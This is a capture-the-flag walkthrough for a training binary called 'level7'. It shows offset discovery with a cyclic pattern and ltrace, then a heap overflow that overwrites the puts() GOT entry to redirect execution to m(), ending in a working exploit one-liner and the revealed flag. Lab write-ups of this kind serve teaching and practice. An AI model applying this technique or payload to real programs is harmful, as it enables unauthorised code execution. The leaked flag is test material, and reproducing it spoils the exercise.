# level 7

There is an exec level6, we bring to local data.

## addresses

m()
    080484f4
puts() GOT
    08049928

[we create patter to find the offset with metasploit](../level6/walkthrough.md)

    ltrace ./level7 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"
    __libc_start_main(0x8048521, 2, 0xbffff4f4, 0x8048610, 0x8048680 <unfinished ...>
    malloc(8)                                                        = 0x0804a008
    malloc(8)                                                        = 0x0804a018
    malloc(8)                                                        = 0x0804a028
    malloc(8)                                                        = 0x0804a038
    strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)        = 0x0804a018
    strcpy(0x37614136, NULL <unfinished ...>
    --- SIGSEGV (Segmentation fault) ---
    +++ killed by SIGSEGV +++

0x37614136 == 7aA6 -> 6Aa7

    $ echo 'Aa0Aa1Aa2Aa3Aa4Aa5Aa' | wc -c # returns 21 including /0 so char count is 20

argv[1]: we are going to offset by 20, then add the address of puts
argv[2]: call to fn m()

The stream is saved in a var called c, this var is then printed in the m() function. we need to call m() after c has been set to the stream value. So we overflow to puts() and call m() here.

    $ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
    5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
